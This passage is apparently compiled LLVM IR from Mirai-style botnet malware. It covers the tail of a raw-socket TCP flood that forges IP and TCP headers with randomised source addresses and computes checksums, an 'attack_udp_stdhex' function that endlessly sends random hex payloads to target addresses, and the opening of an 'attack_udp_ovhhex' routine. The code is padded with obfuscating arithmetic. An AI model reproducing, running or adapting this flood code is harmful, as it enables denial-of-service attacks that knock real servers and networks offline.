  %375 = or i16 3607, %373
  %376 = xor i16 %374, -1
  %377 = and i16 %376, %375
  %378 = and i16 %365, -257
  %379 = xor i16 %377, -1
  %380 = xor i16 %370, -1
  %381 = xor i16 -31690, -1
  %382 = and i16 %379, -31690
  %383 = and i16 %377, %381
  %384 = and i16 %380, -31690
  %385 = and i16 %370, %381
  %386 = or i16 %382, %383
  %387 = or i16 %384, %385
  %388 = xor i16 %386, %387
  %389 = or i16 %379, %380
  %390 = xor i16 %389, -1
  %391 = or i16 -31690, %381
  %392 = and i16 %390, %391
  %393 = or i16 %388, %392
  %394 = or i16 %377, %370
  store i16 %393, i16* %364, align 4
  %395 = call i32 @rand_next()
  %396 = xor i32 65535, -1
  %397 = xor i32 %395, %396
  %398 = and i32 %397, %395
  %399 = and i32 %395, 65535
  %400 = trunc i32 %398 to i16
  %401 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %402 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %401, i32 0, i32 5
  store i16 %400, i16* %402, align 2
  %403 = load i8, i8* %22, align 1
  %404 = icmp ne i8 %403, 0
  br i1 %404, label %405, label %417

; <label>:405:                                    ; preds = %192
  %406 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 4
  %408 = load i16, i16* %407, align 4
  %409 = xor i16 -2049, -1
  %410 = xor i16 %408, %409
  %411 = and i16 %410, %408
  %412 = and i16 %408, -2049
  %413 = and i16 %411, 2048
  %414 = xor i16 %411, 2048
  %415 = or i16 %413, %414
  %416 = or i16 %411, 2048
  store i16 %415, i16* %407, align 4
  br label %417

; <label>:417:                                    ; preds = %405, %192
  %418 = load i8*, i8** %31, align 8
  %419 = load i32, i32* %26, align 4
  call void @rand_str(i8* %418, i32 %419)
  br label %420

; <label>:420:                                    ; preds = %417
  %421 = load i32, i32* %9, align 4
  %422 = sub i32 0, 1
  %423 = sub i32 %421, %422
  %424 = add nsw i32 %421, 1
  store i32 %423, i32* %9, align 4
  br label %118

; <label>:425:                                    ; preds = %118
  br label %426

; <label>:426:                                    ; preds = %609, %425
  store i32 0, i32* %9, align 4
  br label %427

; <label>:427:                                    ; preds = %604, %426
  %428 = load i32, i32* %9, align 4
  %429 = load i8, i8* %5, align 1
  %430 = zext i8 %429 to i32
  %431 = icmp slt i32 %428, %430
  br i1 %431, label %432, label %609

; <label>:432:                                    ; preds = %427
  %433 = load i8**, i8*** %11, align 8
  %434 = load i32, i32* %9, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds i8*, i8** %433, i64 %435
  %437 = load i8*, i8** %436, align 8
  store i8* %437, i8** %32, align 8
  %438 = load i8*, i8** %32, align 8
  %439 = bitcast i8* %438 to %struct.iphdr*
  store %struct.iphdr* %439, %struct.iphdr** %33, align 8
  %440 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %441 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %440, i64 1
  %442 = bitcast %struct.iphdr* %441 to %struct.tcphdr*
  store %struct.tcphdr* %442, %struct.tcphdr** %34, align 8
  %443 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %444 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %443, i64 1
  %445 = bitcast %struct.tcphdr* %444 to i8*
  store i8* %445, i8** %35, align 8
  %446 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %447 = load i32, i32* %9, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i64 %448
  %450 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %449, i32 0, i32 2
  %451 = load i8, i8* %450, align 4
  %452 = zext i8 %451 to i32
  %453 = icmp slt i32 %452, 32
  br i1 %453, label %454, label %477

; <label>:454:                                    ; preds = %432
  %455 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %456 = load i32, i32* %9, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %455, i64 %457
  %459 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %458, i32 0, i32 1
  %460 = load i32, i32* %459, align 4
  %461 = call i32 @ntohl(i32 %460) #7
  %462 = call i32 @rand_next()
  %463 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %464 = load i32, i32* %9, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %463, i64 %465
  %467 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %466, i32 0, i32 2
  %468 = load i8, i8* %467, align 4
  %469 = zext i8 %468 to i32
  %470 = lshr i32 %462, %469
  %471 = sub i32 0, %470
  %472 = sub i32 %461, %471
  %473 = add i32 %461, %470
  %474 = call i32 @htonl(i32 %472) #7
  %475 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i32 0, i32 9
  store i32 %474, i32* %476, align 4
  br label %477

; <label>:477:                                    ; preds = %454, %432
  %478 = load i32, i32* %28, align 4
  %479 = icmp eq i32 %478, -1
  br i1 %479, label %480, label %484

; <label>:480:                                    ; preds = %477
  %481 = call i32 @rand_next()
  %482 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %483 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %482, i32 0, i32 8
  store i32 %481, i32* %483, align 4
  br label %484

; <label>:484:                                    ; preds = %480, %477
  %485 = load i16, i16* %13, align 2
  %486 = zext i16 %485 to i32
  %487 = icmp eq i32 %486, 65535
  br i1 %487, label %488, label %497

; <label>:488:                                    ; preds = %484
  %489 = call i32 @rand_next()
  %490 = xor i32 65535, -1
  %491 = xor i32 %489, %490
  %492 = and i32 %491, %489
  %493 = and i32 %489, 65535
  %494 = trunc i32 %492 to i16
  %495 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %496 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %495, i32 0, i32 3
  store i16 %494, i16* %496, align 4
  br label %497

; <label>:497:                                    ; preds = %488, %484
  %498 = load i16, i16* %16, align 2
  %499 = zext i16 %498 to i32
  %500 = icmp eq i32 %499, 65535
  br i1 %500, label %501, label %514

; <label>:501:                                    ; preds = %497
  %502 = call i32 @rand_next()
  %503 = xor i32 %502, -1
  %504 = xor i32 65535, -1
  %505 = xor i32 1879363908, -1
  %506 = or i32 %503, %504
  %507 = or i32 1879363908, %505
  %508 = xor i32 %506, -1
  %509 = and i32 %508, %507
  %510 = and i32 %502, 65535
  %511 = trunc i32 %509 to i16
  %512 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i32 0, i32 0
  store i16 %511, i16* %513, align 4
  br label %514

; <label>:514:                                    ; preds = %501, %497
  %515 = load i16, i16* %17, align 2
  %516 = zext i16 %515 to i32
  %517 = icmp eq i32 %516, 65535
  br i1 %517, label %518, label %527

; <label>:518:                                    ; preds = %514
  %519 = call i32 @rand_next()
  %520 = xor i32 65535, -1
  %521 = xor i32 %519, %520
  %522 = and i32 %521, %519
  %523 = and i32 %519, 65535
  %524 = trunc i32 %522 to i16
  %525 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %526 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %525, i32 0, i32 1
  store i16 %524, i16* %526, align 2
  br label %527

; <label>:527:                                    ; preds = %518, %514
  %528 = load i32, i32* %18, align 4
  %529 = icmp eq i32 %528, 65535
  br i1 %529, label %530, label %534

; <label>:530:                                    ; preds = %527
  %531 = call i32 @rand_next()
  %532 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %533 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %532, i32 0, i32 2
  store i32 %531, i32* %533, align 4
  br label %534

; <label>:534:                                    ; preds = %530, %527
  %535 = load i32, i32* %19, align 4
  %536 = icmp eq i32 %535, 65535
  br i1 %536, label %537, label %541

; <label>:537:                                    ; preds = %534
  %538 = call i32 @rand_next()
  %539 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %540 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %539, i32 0, i32 3
  store i32 %538, i32* %540, align 4
  br label %541

; <label>:541:                                    ; preds = %537, %534
  %542 = load i8, i8* %27, align 1
  %543 = icmp ne i8 %542, 0
  br i1 %543, label %544, label %547

; <label>:544:                                    ; preds = %541
  %545 = load i8*, i8** %35, align 8
  %546 = load i32, i32* %26, align 4
  call void @rand_str(i8* %545, i32 %546)
  br label %547

; <label>:547:                                    ; preds = %544, %541
  %548 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %549 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %548, i32 0, i32 7
  store i16 0, i16* %549, align 2
  %550 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %551 = bitcast %struct.iphdr* %550 to i16*
  %552 = call zeroext i16 @checksum_generic(i16* %551, i32 20)
  %553 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %554 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %553, i32 0, i32 7
  store i16 %552, i16* %554, align 2
  %555 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %556 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %555, i32 0, i32 6
  store i16 0, i16* %556, align 4
  %557 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %558 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %559 = bitcast %struct.tcphdr* %558 to i8*
  %560 = load i32, i32* %26, align 4
  %561 = sext i32 %560 to i64
  %562 = sub i64 0, %561
  %563 = sub i64 20, %562
  %564 = add i64 20, %561
  %565 = trunc i64 %563 to i16
  %566 = call zeroext i16 @htons(i16 zeroext %565) #7
  %567 = load i32, i32* %26, align 4
  %568 = sext i32 %567 to i64
  %569 = sub i64 20, 3484989329766313533
  %570 = add i64 %569, %568
  %571 = add i64 %570, 3484989329766313533
  %572 = add i64 20, %568
  %573 = trunc i64 %571 to i32
  %574 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %557, i8* %559, i16 zeroext %566, i32 %573)
  %575 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %576 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %575, i32 0, i32 6
  store i16 %574, i16* %576, align 4
  %577 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %578 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %577, i32 0, i32 1
  %579 = load i16, i16* %578, align 2
  %580 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %581 = load i32, i32* %9, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %580, i64 %582
  %584 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %583, i32 0, i32 0
  %585 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %584, i32 0, i32 1
  store i16 %579, i16* %585, align 2
  %586 = load i32, i32* %10, align 4
  %587 = load i8*, i8** %32, align 8
  %588 = load i32, i32* %26, align 4
  %589 = sext i32 %588 to i64
  %590 = sub i64 40, 1228237383706372428
  %591 = add i64 %590, %589
  %592 = add i64 %591, 1228237383706372428
  %593 = add i64 40, %589
  %594 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %595 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %596 = load i32, i32* %9, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %595, i64 %597
  %599 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %598, i32 0, i32 0
  %600 = bitcast %struct.sockaddr_in* %599 to %struct.sockaddr*
  store %struct.sockaddr* %600, %struct.sockaddr** %594, align 8
  %601 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %602 = load %struct.sockaddr*, %struct.sockaddr** %601, align 8
  %603 = call i64 @sendto(i32 %586, i8* %587, i64 %592, i32 16384, %struct.sockaddr* %602, i32 16)
  br label %604

; <label>:604:                                    ; preds = %547
  %605 = load i32, i32* %9, align 4
  %606 = sub i32 0, 1
  %607 = sub i32 %605, %606
  %608 = add nsw i32 %605, 1
  store i32 %607, i32* %9, align 4
  br label %427

; <label>:609:                                    ; preds = %427
  br label %426

; <label>:610:                                    ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca [256 x i8*], align 16
  %20 = alloca i8*, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %23 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %24 = load i8, i8* %5, align 1
  %25 = zext i8 %24 to i64
  %26 = call noalias i8* @calloc(i64 %25, i64 8) #6
  %27 = bitcast i8* %26 to i8**
  store i8** %27, i8*** %10, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 4) #6
  %31 = bitcast i8* %30 to i32*
  store i32* %31, i32** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 7, i32 65535)
  %35 = trunc i32 %34 to i16
  store i16 %35, i16* %12, align 2
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 6, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 0, i32 1458)
  %43 = trunc i32 %42 to i16
  store i16 %43, i16* %14, align 2
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 1, i32 1)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 16, i32 4, i1 false)
  %49 = load i16, i16* %13, align 2
  %50 = zext i16 %49 to i32
  %51 = icmp eq i32 %50, 65535
  br i1 %51, label %52, label %55

; <label>:52:                                     ; preds = %4
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %13, align 2
  br label %58

; <label>:55:                                     ; preds = %4
  %56 = load i16, i16* %13, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %56) #7
  store i16 %57, i16* %13, align 2
  br label %58

; <label>:58:                                     ; preds = %55, %52
  store i32 0, i32* %9, align 4
  br label %59

; <label>:59:                                     ; preds = %179, %58
  %60 = load i32, i32* %9, align 4
  %61 = load i8, i8* %5, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp slt i32 %60, %62
  br i1 %63, label %64, label %184

; <label>:64:                                     ; preds = %59
  %65 = bitcast [256 x i8*]* %19 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %65, i8* bitcast ([256 x i8*]* @attack_udp_stdhex.leon_hex to i8*), i64 2048, i32 16, i1 false)
  %66 = call i32 @rand() #6
  %67 = srem i32 %66, 256
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [256 x i8*], [256 x i8*]* %19, i64 0, i64 %68
  %70 = load i8*, i8** %69, align 8
  store i8* %70, i8** %20, align 8
  %71 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %72 = load i8**, i8*** %10, align 8
  %73 = load i32, i32* %9, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8*, i8** %72, i64 %74
  store i8* %71, i8** %75, align 8
  %76 = load i16, i16* %12, align 2
  %77 = zext i16 %76 to i32
  %78 = icmp eq i32 %77, 65535
  br i1 %78, label %79, label %88

; <label>:79:                                     ; preds = %64
  %80 = call i32 @rand_next()
  %81 = trunc i32 %80 to i16
  %82 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %83 = load i32, i32* %9, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %82, i64 %84
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i32 0, i32 0
  %87 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %86, i32 0, i32 1
  store i16 %81, i16* %87, align 2
  br label %97

; <label>:88:                                     ; preds = %64
  %89 = load i16, i16* %12, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %89) #7
  %91 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %92 = load i32, i32* %9, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %91, i64 %93
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i32 0, i32 0
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %95, i32 0, i32 1
  store i16 %90, i16* %96, align 2
  br label %97

; <label>:97:                                     ; preds = %88, %79
  %98 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %99 = load i32*, i32** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i32, i32* %99, i64 %101
  store i32 %98, i32* %102, align 4
  %103 = icmp eq i32 %98, -1
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %97
  ret void

; <label>:105:                                    ; preds = %97
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %106, align 4
  %107 = load i16, i16* %13, align 2
  %108 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %107, i16* %108, align 2
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %110 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %109, i32 0, i32 0
  store i32 0, i32* %110, align 4
  %111 = load i32*, i32** %11, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i32, i32* %111, i64 %113
  %115 = load i32, i32* %114, align 4
  %116 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %117 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %117, %struct.sockaddr** %116, align 8
  %118 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %119 = load %struct.sockaddr*, %struct.sockaddr** %118, align 8
  %120 = call i32 @bind(i32 %115, %struct.sockaddr* %119, i32 16) #6
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %122, label %123

; <label>:122:                                    ; preds = %105
  br label %123

; <label>:123:                                    ; preds = %122, %105
  %124 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %125 = load i32, i32* %9, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %124, i64 %126
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i32 0, i32 2
  %129 = load i8, i8* %128, align 4
  %130 = zext i8 %129 to i32
  %131 = icmp slt i32 %130, 32
  br i1 %131, label %132, label %160

; <label>:132:                                    ; preds = %123
  %133 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %134 = load i32, i32* %9, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i64 %135
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i32 0, i32 1
  %138 = load i32, i32* %137, align 4
  %139 = call i32 @ntohl(i32 %138) #7
  %140 = call i32 @rand_next()
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 2
  %146 = load i8, i8* %145, align 4
  %147 = zext i8 %146 to i32
  %148 = lshr i32 %140, %147
  %149 = sub i32 0, %148
  %150 = sub i32 %139, %149
  %151 = add i32 %139, %148
  %152 = call i32 @htonl(i32 %150) #7
  %153 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %154 = load i32, i32* %9, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i64 %155
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i32 0, i32 0
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %157, i32 0, i32 2
  %159 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %158, i32 0, i32 0
  store i32 %152, i32* %159, align 4
  br label %160

; <label>:160:                                    ; preds = %132, %123
  %161 = load i32*, i32** %11, align 8
  %162 = load i32, i32* %9, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds i32, i32* %161, i64 %163
  %165 = load i32, i32* %164, align 4
  %166 = bitcast %union.__CONST_SOCKADDR_ARG* %22 to %struct.sockaddr**
  %167 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %168 = load i32, i32* %9, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 0
  %172 = bitcast %struct.sockaddr_in* %171 to %struct.sockaddr*
  store %struct.sockaddr* %172, %struct.sockaddr** %166, align 8
  %173 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %22, i32 0, i32 0
  %174 = load %struct.sockaddr*, %struct.sockaddr** %173, align 8
  %175 = call i32 @connect(i32 %165, %struct.sockaddr* %174, i32 16)
  %176 = icmp eq i32 %175, -1
  br i1 %176, label %177, label %178

; <label>:177:                                    ; preds = %160
  br label %178

; <label>:178:                                    ; preds = %177, %160
  br label %179

; <label>:179:                                    ; preds = %178
  %180 = load i32, i32* %9, align 4
  %181 = sub i32 0, 1
  %182 = sub i32 %180, %181
  %183 = add nsw i32 %180, 1
  store i32 %182, i32* %9, align 4
  br label %59

; <label>:184:                                    ; preds = %59
  br label %185

; <label>:185:                                    ; preds = %218, %184
  store i32 0, i32* %9, align 4
  br label %186

; <label>:186:                                    ; preds = %213, %185
  %187 = load i32, i32* %9, align 4
  %188 = load i8, i8* %5, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp slt i32 %187, %189
  br i1 %190, label %191, label %218

; <label>:191:                                    ; preds = %186
  %192 = load i8**, i8*** %10, align 8
  %193 = load i32, i32* %9, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds i8*, i8** %192, i64 %194
  %196 = load i8*, i8** %195, align 8
  store i8* %196, i8** %23, align 8
  %197 = load i8, i8* %15, align 1
  %198 = icmp ne i8 %197, 0
  br i1 %198, label %199, label %203

; <label>:199:                                    ; preds = %191
  %200 = load i8*, i8** %23, align 8
  %201 = load i16, i16* %14, align 2
  %202 = zext i16 %201 to i32
  call void @rand_str(i8* %200, i32 %202)
  br label %203

; <label>:203:                                    ; preds = %199, %191
  %204 = load i32*, i32** %11, align 8
  %205 = load i32, i32* %9, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds i32, i32* %204, i64 %206
  %208 = load i32, i32* %207, align 4
  %209 = load i8*, i8** %23, align 8
  %210 = load i16, i16* %14, align 2
  %211 = zext i16 %210 to i64
  %212 = call i64 @send(i32 %208, i8* %209, i64 %211, i32 16384)
  br label %213

; <label>:213:                                    ; preds = %203
  %214 = load i32, i32* %9, align 4
  %215 = sub i32 0, 1
  %216 = sub i32 %214, %215
  %217 = add nsw i32 %214, 1
  store i32 %216, i32* %9, align 4
  br label %186

; <label>:218:                                    ; preds = %186
  br label %185
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_ovhhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca [256 x i8*], align 16
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %36 = load i8, i8* %5, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %11, align 8
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %12, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %13, align 2
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %15, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %16, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %17, align 2
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 17, i32 65535)
  store i32 %66, i32* %18, align 4
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 18, i32 0)
  store i32 %69, i32* %19, align 4
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 11, i32 0)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %20, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 12, i32 0)
